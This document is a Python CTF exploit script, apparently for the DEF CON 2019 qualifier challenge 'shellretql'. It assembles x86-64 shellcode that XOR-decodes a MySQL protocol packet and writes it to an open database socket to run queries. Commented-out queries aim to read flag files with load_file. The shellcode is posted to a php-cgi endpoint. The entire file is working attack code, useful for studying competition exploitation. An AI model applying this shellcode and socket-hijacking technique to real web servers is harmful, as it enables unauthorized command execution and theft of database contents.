#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import urllib

context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':'php-cgi ./index.php'.split(), 'aslr':False}, \
                        local   = {'argv':'php-cgi ./index.php'.split()}, \
                        remote  = {'host':'shellretql.quals2019.oooverflow.io', 'port':9090})
env.select()

#==========

def attack(conn, **kwargs):
    # query = chr(0x11)+'root\x00'+chr(0)+''+'\x00'+p16(33)+'\x00'+p16(0)

    '''
    sql = "select version()"
    sql = "select hex(load_file('/var/lib/mysql-files/flag'))"
    sql = "show variables like 'secure_file_priv'"
    sql = "show variables like 'local_infile'"
    sql = "show grants for shellql"
    sql = "select load_file('/flag')"
    '''

    sql = "show grants"
    sql = 'show full processlist';
    query = chr(3)+sql

    msg = '\r\n\r\n'+p32(len(query))+query
    shellasm = '''
    lea rbx, [rip-1]
    add bx, 0x111-7
    xor rcx, rcx
decode:
    xor byte ptr [rbx+rcx], 1
    inc rcx
    cmp cl, {msglen}
    jb decode

    xor rdi, rdi
    add di, 4
    mov rsi, rbx
    add si, 4
    xor rdx, rdx
    mov dl, {msglen}-4
    xor rax, rax
    inc rax
    syscall

    xor rdi, rdi
    add di, 4
    mov rsi, rbx
    add si, 4
    xor rdx, rdx
    mov dh, 0x10
    xor rax, rax
    syscall

    xor rdi, rdi
    add di, 1
    mov rsi, rbx
    mov rdx, rax
    xor rax, rax
    inc rax
    syscall

    xor rax, rax
    add ax, 0x3c
    xor rdi, rdi
    syscall
    '''.format(msglen=len(msg))

    shellcode = asm(shellasm).ljust(0x110, '\xff')+xor(msg, 0x1)
    if env.check('remote'):
        data = urllib.urlencode({'shell': shellcode})
        request = '''POST /cgi-bin/index.php HTTP/1.1\r
Accept-Encoding: identity\r
Content-Length: {}\r
Host: shellretql.quals2019.oooverflow.io:9090\r
Content-Type: application/x-www-form-urlencoded\r
Connection: close\r
User-Agent: Python-urllib/2.7\r
\r
{}\r'''.format(len(data), data)

        conn.send(request)
    else:
        conn.send(shellcode)

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    
#==========
